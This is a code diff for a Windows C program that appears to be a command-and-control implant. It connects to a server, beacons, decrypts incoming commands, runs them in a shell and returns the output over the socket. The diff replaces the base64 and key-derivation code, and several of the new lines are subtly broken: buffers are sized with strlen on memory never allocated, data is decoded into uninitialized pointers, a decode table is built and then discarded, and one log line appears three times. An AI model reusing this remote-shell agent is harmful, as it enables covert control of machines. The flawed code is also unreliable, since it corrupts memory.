@@ -29,86 +29,181 @@ void log_it(const char* format, ...) {
     va_end(args);
 }
 
-char* get_session_id(const char* ip_address) {
-    char* session_id = malloc(65); // SHA256 is 64 chars + null terminator
-    if (!session_id) {
-        return NULL;
+char* get_ip_address(char* ipAddress, size_t ip_len) {
+    // Example logic: Assign the IPv6 loopback address ::1
+    snprintf(ipAddress, ip_len, "::1");
+
+    // Replace ::1 with 127.0.0.1
+    if (strcmp(ipAddress, "::1") == 0) {
+        strncpy(ipAddress, "127.0.0.1", ip_len);
     }
+
+    return ipAddress;
+}
+
+void get_session_id() {
+    char ip_address[IP_ADDRESS_LENGTH] = {0};
+    get_ip_address(ip_address, sizeof(ip_address));
+
+    log_it("IP Address: %s", ip_address);  // Log the IP address
+
+    int sum = 0;
+    char* token = strtok(ip_address, ".");
+    while (token != NULL) {
+        sum += atoi(token);
+        token = strtok(NULL, ".");
+    }
+
+    char input[IP_ADDRESS_LENGTH + 12];
+    snprintf(input, sizeof(input), "%s<>%d", ip_address, sum);
 
     unsigned char hash[SHA256_DIGEST_LENGTH];
-    char data[256];
-    int sum = 0;
-    char* ip_copy = _strdup(ip_address);
-    char* ip_parts = strtok(ip_copy, ".");
-    while (ip_parts != NULL) {
-        sum += atoi(ip_parts);
-        ip_parts = strtok(NULL, ".");
-    }
-    snprintf(data, sizeof(data), "%s<>%d", ip_address, sum);
-    SHA256((unsigned char*)data, strlen(data), hash);
+    SHA256((unsigned char*)input, strlen(input), hash);
 
-    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
-        snprintf(&session_id[i*2], strlen(&session_id[i*2]), "%02x", hash[i]);
+    for (int i = 0; i < SESSION_ID_LENGTH / 2; i++) {
+        snprintf(&SESSION_ID[i * 2], 3, "%02x", hash[i]);
     }
-    session_id[64] = '\0';
-    free(ip_copy);
-    return session_id;
+
+    SESSION_ID[SESSION_ID_LENGTH] = '\0';  // Null-terminate the string
+
+    log_it("Session ID: %s", SESSION_ID);  // Log the Session ID
+}
+
+size_t b64_encoded_size(size_t inlen) {
+	size_t ret;
+
+	ret = inlen;
+	if (inlen % 3 != 0)
+		ret += 3 - (inlen % 3);
+	ret /= 3;
+	ret *= 4;
+
+	return ret;
+}
+
+size_t b64_decoded_size(const char *in)
+{
+	size_t len;
+	size_t ret;
+	size_t i;
+
+	if (in == NULL)
+		return 0;
+
+	len = strlen(in);
+	ret = len / 4 * 3;
+
+	for (i=len; i-->0; ) {
+		if (in[i] == '=') {
+			ret--;
+		} else {
+			break;
+		}
+	}
+
+	return ret;
+}
+
+void b64_generate_decode_table() {
+	int    inv[80];
+	size_t i;
+
+	memset(inv, -1, sizeof(inv));
+	for (i=0; i<sizeof(base64_chars)-1; i++) {
+		inv[base64_chars[i]-43] = i;
+	}
+}
+
+int b64_isvalidchar(char c) {
+	if (c >= '0' && c <= '9')
+		return 1;
+	if (c >= 'A' && c <= 'Z')
+		return 1;
+	if (c >= 'a' && c <= 'z')
+		return 1;
+	if (c == '+' || c == '/' || c == '=')
+		return 1;
+	return 0;
 }
 
 // Function to encode base64
-char* base64_encode(const unsigned char *data, size_t length) {
-    BIO *bio, *b64;
-    BUF_MEM *buffer_ptr;
-    char *buffer;
+char *base64_encode(const unsigned char *in, size_t len) {
+	char   *out;
+	size_t  elen;
+	size_t  i;
+	size_t  j;
+	size_t  v;
 
-    b64 = BIO_new(BIO_f_base64());
-    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // Do not include newlines in base64 encoded output
-    bio = BIO_new(BIO_s_mem());
-    bio = BIO_push(b64, bio);
-    BIO_write(bio, data, length);
-    BIO_flush(bio);
-    BIO_get_mem_ptr(bio, &buffer_ptr);
+	if (in == NULL || len == 0)
+		return NULL;
 
-    buffer = (char *)malloc(buffer_ptr->length + 1); // Allocate enough space for null-terminator
-    memcpy(buffer, buffer_ptr->data, buffer_ptr->length);
-    buffer[buffer_ptr->length] = '\0';  // Null-terminate
+	elen = b64_encoded_size(len);
+	out  = malloc(elen+1);
+	out[elen] = '\0';
 
-    BIO_free_all(bio);
-    return buffer;
+	for (i=0, j=0; i<len; i+=3, j+=4) {
+		v = in[i];
+		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
+		v = i+2 < len ? v << 8 | in[i+2] : v << 8;
+
+		out[j]   = base64_chars[(v >> 18) & 0x3F];
+		out[j+1] = base64_chars[(v >> 12) & 0x3F];
+		if (i+1 < len) {
+			out[j+2] = base64_chars[(v >> 6) & 0x3F];
+		} else {
+			out[j+2] = '=';
+		}
+		if (i+2 < len) {
+			out[j+3] = base64_chars[v & 0x3F];
+		} else {
+			out[j+3] = '=';
+		}
+	}
+
+	return out;
 }
 
+// Function to decode a Base64 encoded string into binary data
+int base64_decode(const char *in, unsigned char *out, size_t outlen) {
+	size_t len;
+	size_t i;
+	size_t j;
+	int    v;
 
-// Function to decode base64
-unsigned char* base64_decode(const char *data, size_t *length) {
-    BIO *bio, *b64;
-    size_t len = strlen(data);
-    unsigned char *buffer;
+	if (in == NULL || out == NULL)
+		return 0;
 
-    // Allocate buffer to hold the decoded data. Estimate the size based on input length.
-    // Base64 encoded data is approximately 4/3 of the original size.
-    buffer = (unsigned char *)malloc(len * 3 / 4 + 1); 
+	len = strlen(in);
+	if (outlen < b64_decoded_size(in) || len % 4 != 0)
+		return 0;
 
-    b64 = BIO_new(BIO_f_base64());
-    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // Do not expect newlines in base64 encoded input
-    bio = BIO_new_mem_buf(data, len);
-    bio = BIO_push(b64, bio);
-    
-    *length = BIO_read(bio, buffer, len);
-    buffer[*length] = '\0'; // Null-terminate the decoded output
+	for (i=0; i<len; i++) {
+		if (!b64_isvalidchar(in[i])) {
+			return 0;
+		}
+	}
 
-    BIO_free_all(bio);
-    return buffer;
-}
+	for (i=0, j=0; i<len; i+=4, j+=3) {
+		v = base64_invs[in[i]-43];
+		v = (v << 6) | base64_invs[in[i+1]-43];
+		v = in[i+2]=='=' ? v << 6 : (v << 6) | base64_invs[in[i+2]-43];
+		v = in[i+3]=='=' ? v << 6 : (v << 6) | base64_invs[in[i+3]-43];
 
-// Function to derive key using PBKDF2
-void derive_key(const unsigned char *shared_key, unsigned char *salt, unsigned char *key) {
-    PKCS5_PBKDF2_HMAC((const char *)shared_key, strlen((const char *)shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);
+		out[j] = (v >> 16) & 0xFF;
+		if (in[i+2] != '=')
+			out[j+1] = (v >> 8) & 0xFF;
+		if (in[i+3] != '=')
+			out[j+2] = v & 0xFF;
+	}
+
+	return 1;
 }
 
 // Encryption function
 char* encrypt_data(const char *data, const char *shared_key) {
     unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], key[KEY_LENGTH];
-    unsigned char auth_tag[TAG_LENGTH], encrypted_data[1024];
+    unsigned char auth_tag[TAG_LENGTH];
+    unsigned char *encrypted_data = NULL;
     int len, encrypted_data_len;
     EVP_CIPHER_CTX *ctx;
 
@@ -117,7 +212,7 @@ char* encrypt_data(const char *data, const char *shared_key) {
     RAND_bytes(iv, IV_LENGTH);
 
     // Derive key
-    derive_key((unsigned char *)shared_key, salt, key);
+    PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);
 
     // Initialize encryption context
     ctx = EVP_CIPHER_CTX_new();
@@ -142,10 +237,15 @@ char* encrypt_data(const char *data, const char *shared_key) {
     char *auth_tag_b64 = base64_encode(auth_tag, TAG_LENGTH);
     char *encrypted_data_b64 = base64_encode(encrypted_data, encrypted_data_len);
 
+    log_it("Salt b64: %s", salt_b64);
+    log_it("Salt b64: %s", salt_b64);
+    log_it("Salt b64: %s", salt_b64);
+
     // Prepare the result string
     char *result = (char *)malloc(strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4);
-    snprintf(result, sizeof(result), "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);
+    snprintf(result, strlen(result), "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);
 
+    OPENSSL_cleanse(key, strlen(key));
     free(salt_b64);
     free(iv_b64);
     free(auth_tag_b64);
@@ -156,12 +256,10 @@ char* encrypt_data(const char *data, const char *shared_key) {
 // Decryption function
 char* decrypt_data(const char *encrypted, const char *shared_key) {
     unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], auth_tag[TAG_LENGTH];
-    unsigned char encrypted_data[1024];
+    unsigned char encrypted_data[CHUNK_SIZE];
     unsigned char key[KEY_LENGTH];
     int encrypted_data_len, decrypted_len;
     EVP_CIPHER_CTX *ctx;
-    size_t len;
-    int out_len;
 
     // Make a copy of the input string to avoid modifying the original
     char *encrypted_copy = strdup(encrypted);
@@ -181,39 +279,24 @@ char* decrypt_data(const char *encrypted, const char *shared_key) {
             return NULL; // Invalid input
         }
     }
+    
+    unsigned char *salt_b64, *iv_b64, *auth_tag_b64, *encrypted_data_b64;
 
-    // Decode from base64
-    unsigned char *salt_b64 = base64_decode(parts[0], &len);
-    if (len != SALT_LENGTH) {
-        free(salt_b64);
-        return NULL; // Decoding failed or incorrect length
-    }
+    base64_decode(parts[0], salt_b64, SALT_LENGTH);
     memcpy(salt, salt_b64, SALT_LENGTH);
-    free(salt_b64);
 
-    unsigned char *iv_b64 = base64_decode(parts[1], &len);
-    if (len != IV_LENGTH) {
-        free(iv_b64);
-        return NULL; // Decoding failed or incorrect length
-    }
+    base64_decode(parts[1], iv_b64, IV_LENGTH);
     memcpy(iv, iv_b64, IV_LENGTH);
-    free(iv_b64);
 
-    unsigned char *auth_tag_b64 = base64_decode(parts[2], &len);
-    if (len != TAG_LENGTH) {
-        free(auth_tag_b64);
-        return NULL; // Decoding failed or incorrect length
-    }
+    base64_decode(parts[2], auth_tag_b64, TAG_LENGTH);
     memcpy(auth_tag, auth_tag_b64, TAG_LENGTH);
-    free(auth_tag_b64);
-
-    unsigned char *encrypted_data_b64 = base64_decode(parts[3], &len);
-    encrypted_data_len = len;
-    memcpy(encrypted_data, encrypted_data_b64, encrypted_data_len);
-    free(encrypted_data_b64);
+    
+    size_t out_len = b64_decoded_size(encrypted_copy)+1;
+    base64_decode(parts[3], encrypted_data_b64, out_len);
+    memcpy(encrypted_data, encrypted_data_b64, strlen(encrypted_copy));
 
     // Derive key
-    derive_key((unsigned char *)shared_key, salt, key);
+    PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);
 
     // Initialize decryption context
     ctx = EVP_CIPHER_CTX_new();
@@ -254,6 +337,11 @@ char* decrypt_data(const char *encrypted, const char *shared_key) {
 
     // Null-terminate the decrypted data
     encrypted_data[decrypted_len] = '\0';
+
+    free(encrypted_data_b64);
+    free(auth_tag_b64);
+    free(iv_b64);
+    free(salt_b64);
     return (char *)strdup((const char *)encrypted_data);
 }
 
@@ -286,7 +374,7 @@ void send_command(const char* response) {
             int result = send(client_socket, chunk, chunk_size, 0);
             if (result == SOCKET_ERROR) {
                 int error_code = WSAGetLastError();
-                log_it("Send failed with error: %d\n", error_code);
+                log_it("Send failed with error: %d", error_code);
                 free(encrypted);
                 return;
             }
@@ -298,7 +386,7 @@ void send_command(const char* response) {
         int result = send(client_socket, encrypted, encrypted_len, 0);
         if (result == SOCKET_ERROR) {
             int error_code = WSAGetLastError();
-            fprintf(stderr, "Send failed with error: %d\n", error_code);
+            fprintf(stderr, "Send failed with error: %d", error_code);
             free(encrypted);
             return;
         }
@@ -522,8 +610,10 @@ char* run_command(const char* command) {
             return _strdup("Memory allocation failed");
         }
         output = new_output;
-        strcpy_s(output + output_size, len + 1, buffer);
+        strncpy(output + output_size, buffer, len + 1);
         output_size += len;
+        // null terminate
+        output[output_size] = '\0';
     }
 
     _pclose(pipe);
@@ -532,16 +622,16 @@ char* run_command(const char* command) {
 
 // Function to handle connection and communication
 void handle_connection() {
-    char buffer[1024] = {0};
+    char buffer[CHUNK_SIZE] = {0};
     while (!exit_process) {
-        int valread = recv(client_socket, buffer, 1024, 0);
+        int valread = recv(client_socket, buffer, CHUNK_SIZE, 0);
         if (valread > 0) {
             char* decrypted = decrypt_data(buffer, SESSION_ID);
             if (decrypted) {
                 parse_action(decrypted);
             }
             free(decrypted);
-            ZeroMemory(buffer, 1024);
+            ZeroMemory(buffer, CHUNK_SIZE);
         } else if (valread == 0) {
             log_it("Server disconnected");
             break;
@@ -572,7 +662,7 @@ int connect_to_server() {
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    snprintf(port_str, sizeof(port_str), "%d", SERVER_PORT);
+    snprintf(port_str, strlen(port_str), "%d", SERVER_PORT);
 
     // Resolve the server address and port
     iResult = getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result);
@@ -626,18 +716,7 @@ int connect_to_server() {
     log_it("Connected to server successfully");
     
     // Generate and store session ID
-    char* new_session_id = get_session_id(SERVER_ADDRESS);
-    if (new_session_id == NULL) {
-        log_it("Failed to generate session ID");
-        closesocket(client_socket);
-        WSACleanup();
-        return -1;
-    }
-    
-    if (SESSION_ID != NULL) {
-        free(SESSION_ID);
-    }
-    SESSION_ID = new_session_id;
+    get_session_id();
 
     return 0;
 }
@@ -654,7 +733,7 @@ int main() {
     while (!exit_process) {
         if (connect_to_server() < 0) {
             log_it("Failed to connect to server");
-            sleep_ms(get_retry_interval(0));
+            sleep_ms(get_retry_interval(MAX_RETRIES));
         } else {
             // Send initial beacon
             start_beacon_interval();
